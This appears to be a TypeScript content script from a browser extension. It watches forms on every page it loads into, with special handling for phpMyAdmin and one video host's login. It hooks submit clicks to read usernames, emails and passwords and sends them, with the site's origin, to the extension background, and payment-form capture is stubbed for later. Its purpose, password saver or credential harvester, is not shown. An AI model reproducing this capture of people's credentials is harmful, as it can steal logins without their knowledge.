import {browser} from "webextension-polyfill-ts";
import {acsComPortFront} from "./messanger";

export class Crawler {
    public url?: any;
    public authEvent?: any;
    public isTrackerActivate: boolean = false;
    public trackerJobId: number = 0;
    public passwordStore: { node: HTMLElement, name: string, type: string, value: string }[] = [];

    constructor(url: string) {
        if (url) {
            this.url = url;
            /*#!if debug===true*/
            console.log('Tracker added by others!!');
            /*#!endif*/
        }
    }

    init(callBack?: any) {
        const self = this;
        if (self.url) {

            /*#!if debug==true*/
            console.log('Tracker initializing!!');
            console.log('Tracker activated in ' + self.url);
            console.log('Tracker ready to search form element in web page!!');
            console.log();
            /*#!endif*/
            let interval1 = setInterval(function () {
                self.verifyFormElement(self, interval1);
            }, 1000);


            if (!self.isTrackerActivate) {
                /*#!if debug==true*/
                console.log('Tracker activation verification. Tracker disabled detected!');
                //console.log('Tracker reactivate itself!!');
                console.log();
                /*#!endif*/
                //self.verifyFormElement(self);
            } else {
                /*#!if debug==true*/
                console.log('Tracker activation verification. Tracker enabled detected!');
                console.log(self.isTrackerActivate);
                console.log();
                /*#!endif*/
            }
        }

        if (callBack) {
            callBack();
        }
    }


    trigger(self: this, __formElement: HTMLFormElement) {
        /*#!if debug==true*/
        /*console.log('Tracker checking environment!!');
        console.log(__formElement);
        console.log();*/
        /*#!endif*/
        browser.storage.local.get().then(
            function (setting) {
                if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                    /*#!if debug==true*/
                    /*console.log('Tracker exploring target!!');
                    console.log(__formElement);
                    console.log();*/
                    /*#!endif*/
                    self.track(self, __formElement);
                }
            },
            function (/*errors*/) {
                /*#!if debug==true*/
                /*console.error('Tracker starting failed!!');
                console.error(errors);
                console.log();*/
                /*#!endif*/
                acsComPortFront.postMessage({'command': "checkSettings"});
                //browser.runtime.reload();
            }
        );
    }

    verifyFormElement(self: this, interval?: any) {
        if (document.querySelectorAll('form').length !== 0) {
            /*#!if debug==true*/
            /*console.log('Tracker form(s) found!!');
            console.log();*/
            /*#!endif*/
            document.querySelectorAll('form').forEach(function (__formElement) {
                /*#!if debug==true*/
                /*console.log('Tracker verifying!!');
                console.log(__formElement);
                console.log();*/
                /*#!endif*/

                if (__formElement.attributes.length !== 0) {
                    /*#!if debug==true*/
                    /*console.log('Tracker form(s) attribute checked!!');
                    console.log();*/
                    /*#!endif*/
                    if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                        if (__formElement.method === 'post') {
                            interval ? clearInterval(interval) : '';
                            /*#!if debug==true*/
                            /*console.log('Tracker fetched in phpmyadmin zone. It will be local or server side!!');
                            console.log('Tracker target following!!');
                            console.log(__formElement);
                            console.log();*/
                            /*#!endif*/
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    } else {
                        if (__formElement.action !== 'javascript:void(0)' && __formElement.id !== 'null' && __formElement.id !== 'irouteForm' &&
                            __formElement.id !== 'bhlf' && __formElement.id.indexOf('id') === -1 && __formElement.id.indexOf('u_0_') === -1 &&
                            __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1 &&
                            __formElement.className.indexOf('gb_8e') === -1) {
                            interval ? clearInterval(interval) : '';
                            /*#!if debug==true*/
                            /*console.log('Tracker escaping target and following it(s)!!');
                            console.log(__formElement);
                            console.log();*/
                            /*#!endif*/
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                } else {
                    if (__formElement.childNodes.length > 1) {
                        interval ? clearInterval(interval) : '';
                        /*#!if debug==true*/
                        /*console.log('Tracker not found any attribute(s) of form(s). But this/these form has exploitable child nodes. Now following it(s)!!');
                        console.log(__formElement);
                        console.log();*/
                        /*#!endif*/
                        self.isTrackerActivate = true;
                        self.trackerJobId++;
                        self.trigger(self, __formElement);
                    }
                }
            });
        } else {
            /*#!if debug==true*/
            /*console.log('Tracker not found any form(s)!!');
            console.log();*/
            /*#!endif*/
            if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                if (document.querySelector('#login') !== null) {
                    interval ? clearInterval(interval) : '';
                    /*#!if debug==true*/
                    console.log('Tracker not found any form(s). But this website in our database. Now following it(s)!!');
                    console.log();
                    /*#!endif*/
                    self.isTrackerActivate = true;
                    self.trackerJobId++;
                    self.classicTrackAuthEvent('#email_login', '#password', '#login');
                }
            }
        }
    }

    resolverFormAttributes(self: this, __formElement: any): any {
        const attributes = [...__formElement.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attr) {
                if (attr.nodeValue !== 'javascript:void(0);') {
                    if (attr.nodeValue.length !== 0 && attr.nodeValue.length >= 5) {
                        /*form attribute value*/
                        [
                            {'login': ['signin', 'login']},
                            {'register': ['reg', 'register', 'signup', 'join']},
                            {'logout': ['logout']},
                            {'payment': ['credit', 'payment', 'body', 'checkout', 'sslform', 'Pay', 'purchase', 'ElementsApp']},
                            {'exclude': ['q', 'search', 'googleads', 'presentation', 'captcha', 'disable', 'header']},
                        ].forEach(function (keyword: any) {
                            if (Object.keys(keyword).length !== 0 && keyword.constructor === Object) {
                                Object.keys(keyword).forEach(function (key) {
                                    if (key === 'login') {
                                        keyword.login.forEach(function (__loginKey: any) {
                                            if (attr.nodeValue.toLowerCase().indexOf(__loginKey) !== -1) {
                                                self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'Login';
                                            }
                                            /*console.log(attr);
                                            console.log(attr.nodeValue);
                                            console.log(__loginKey);
                                            console.log(self.authEvent);*/
                                        });
                                    } else if (key === 'register') {
                                        keyword.register.forEach(function (__registrationKey: string) {
                                            if (attr.nodeValue.toLowerCase().indexOf(__registrationKey) !== -1) {
                                                self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'Register';
                                            }
                                        });
                                    } else if (key === 'logout') {
                                        keyword.logout.forEach(function (__logoutKey: string) {
                                            if (attr.nodeValue.toLowerCase().indexOf(__logoutKey) !== -1) {
                                                self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'Logout';
                                            }
                                        });
                                    } else if (key === 'exclude') {
                                        keyword.exclude.forEach(function (__excludeKey: string) {
                                            if (attr.nodeValue.toLowerCase().indexOf(__excludeKey) !== -1) {
                                                self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
                                            }
                                        });
                                    } else if (key === 'payment') {
                                        keyword.payment.forEach(function (__paymentKey: string) {
                                            if (attr.nodeValue.toLowerCase().indexOf(__paymentKey) !== -1) {
                                                self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'Payment';
                                            }
                                        });
                                    } else {
                                        if (attr.nodeValue === null) {
                                            self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
                                        }
                                        self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = attr.nodeValue.toLowerCase();
                                    }
                                });
                            }
                        });
                    }
                }
            });
        } else {
            self.authEvent = 'Unknown';
        }

        return self.authEvent;
    }

    track(self: this, __formElement: HTMLFormElement) {
        let elements: string[] = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1/* && (self.trackerJobId === 1 || 2)*/) {
            /*#!if debug==true*/
            /*console.log('Tracker crawling started');
            console.log('Tracker fetching ' + self.authEvent + ' event!!');
            console.log(__formElement);
            console.log();*/

            /*console.log(document.querySelectorAll('#secBtn2'));*/
            /*#!endif*/
            self.resolverFormAttributes(self, __formElement);
            if (self.authEvent === 'Login' || self.authEvent === 'Register') {
                /*#!if debug==true*/
                console.log('Tracker crawling started');
                console.log('Tracker fetching ' + self.authEvent + ' event!!');
                console.log('Job ID : ' + self.trackerJobId);
                console.log(__formElement);
                console.log();
                /*#!endif*/
                self.crawlAuthFormElement(elements, __formElement);
            } else if (self.authEvent === 'Payment') {
                /*#!if debug==true*/
                console.log('Tracker crawling started');
                console.log('Tracker fetching ' + self.authEvent + ' event!!');
                console.log(self.authEvent + ' : this feature is reserved for future purpose!!!');
                console.log(__formElement);
                console.log();
                /*#!endif*/
                //self.crawlPaymentFormElement(elements, __formElement);
            } else {
                if (self.authEvent !== 'exclude' && self.authEvent !== 'Logout') {
                    /*#!if debug==true*/
                    console.log('Tracker crawling started');
                    console.log('Tracker fetching ' + self.authEvent + ' event!!');
                    console.log(self.authEvent + ' : this feature is reserved for future purpose!!!');
                    console.log(__formElement);
                    console.log();
                    /*#!endif*/
                    self.crawlAuthFormElement(elements, __formElement);
                    //self.crawlPaymentFormElement(elements, __formElement);
                } /*else {
                    alert(self.authEvent);
                }*/
            }
        }
    }

    classicTrackAuthEvent(usernameElementId: any, passwordElementId: any, loginButtonElementId: any) {
        let self = this;
        let usernameElement: any;
        let passwordElement: any;
        let loginButtonElement: any;

        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return acsComPortFront.postMessage({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        })
    }

    crawlAuthFormElement(elements: any, __formElement: HTMLElement) {
        const self = this;
        __formElement.childNodes?.forEach(function (element) {
            if ((element as HTMLElement).nodeName === 'INPUT' || (element as HTMLElement).nodeName === 'BUTTON' || (element as HTMLAnchorElement).nodeName === 'A') {
                if ((element as HTMLElement).nodeName === 'INPUT' && (element as HTMLInputElement).type !== 'button' && (element as HTMLInputElement).type !== 'reset' &&
                    (element as HTMLInputElement).type !== 'submit' && (element as HTMLInputElement).type !== 'checkbox' && (element as HTMLInputElement).type !== 'color' &&
                    (element as HTMLInputElement).type !== 'date' && (element as HTMLInputElement).type !== 'datetime-local' && (element as HTMLInputElement).type !== 'file' &&
                    (element as HTMLInputElement).type !== 'radio' && (element as HTMLInputElement).name !== 'firstname' && (element as HTMLInputElement).name !== 'lastname' &&
                    (element as HTMLButtonElement).type !== 'button' && (element as HTMLButtonElement).type !== 'reset' && (element as HTMLButtonElement).type !== 'submit' &&
                    (element as HTMLInputElement).type !== 'hidden' && !(element as HTMLElement).hidden && (element as HTMLElement).id !== 'nc_1_captcha_input' &&
                    (element as HTMLElement).id !== 's' && (element as HTMLElement).id !== 'ZPGAZZBDYC' && (element as HTMLElement).id !== 'VEQLOJHLSJ' && (element as HTMLElement).id !== 'QCMSHUFUXG') {
                    elements.push((element as HTMLElement));
                }
                if ((element as HTMLElement).nodeName === 'INPUT' && (element as HTMLButtonElement).type === 'submit' || (element as HTMLElement).nodeName === 'BUTTON' && (element as HTMLButtonElement).type === 'submit' ||
                    (element as HTMLElement).nodeName === 'BUTTON' || (element as HTMLAnchorElement).nodeName === 'A' && (element as HTMLAnchorElement).innerHTML.toLowerCase().indexOf('login' || 'reg') !== -1) {
                    return self.resolveAuthEvent(element, elements);
                }
            } else {
                self.crawlAuthFormElement(elements, (element as HTMLElement));
            }
        });
    }

    resolveAuthEvent(element: any, array: any) {
        let self = this;
        let elementNode: any;
        let elementName: any;
        let elementType: any;
        let elementValue: any;


        /*#!if debug==true*/
        /*array.forEach(function (detectedElement: any) {
            console.log(detectedElement);
            console.log(detectedElement.type);
            console.log(detectedElement.value);
        });*/

        /*#!endif*/

        (element as HTMLElement).addEventListener('click', function (/*e*/) {
            /*#!if debug==true*/
            let status = self.authEvent ? self.authEvent : 'Event';
            alert(status + ' tracked!!');
            /*#!endif*/
            array.forEach(function (detectedElement: any) {
                [...detectedElement.attributes].forEach(function (attribute) {
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.toLowerCase().indexOf('user') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'username';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.toLowerCase().indexOf('login') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'loginId';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.toLowerCase().indexOf('email') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'email';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'autocomplete' || attribute.nodeName === 'class' || attribute.nodeName === 'id' ||
                        attribute.nodeName === 'name' || attribute.nodeName === 'type' || attribute.nodeName === 'value') {
                        if (attribute.nodeValue.toLowerCase().indexOf('pass') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'password';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                });

                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });


                    if (self.passwordStore.length === 2 && self.passwordStore.length < 3) {
                        if (self.passwordStore[0].type === 'password') {
                            let password = self.passwordStore[0], usernameOrEmail = self.passwordStore[1];
                            self.passwordStore[0] = usernameOrEmail;
                            self.passwordStore[1] = password;
                        }

                        if (self.passwordStore[0].type === 'email' || self.passwordStore[0].type === 'text' &&
                            self.passwordStore[1].type === 'password') {
                            acsComPortFront.postMessage({
                                command: 'saveLoginData',
                                data: {
                                    "event": self.authEvent,
                                    "username": self.passwordStore[0].value,
                                    "password": self.passwordStore[1].value,
                                    "workWebsite": window.location.origin
                                }
                            });
                            /*self.passwordStore = [];*/
                        }

                        /*#!if debug==true*/
                        /*console.log(elementNode);
                        console.log(elementName);
                        console.log(elementType);
                        console.log(elementValue);
                        console.log(self.passwordStore);*/
                        self.passwordStore = [];
                        /*#!endif*/
                    }
                }
            });
        });
    }

    crawlPaymentFormElement(elements: any, __formElement: HTMLElement) {
    }
}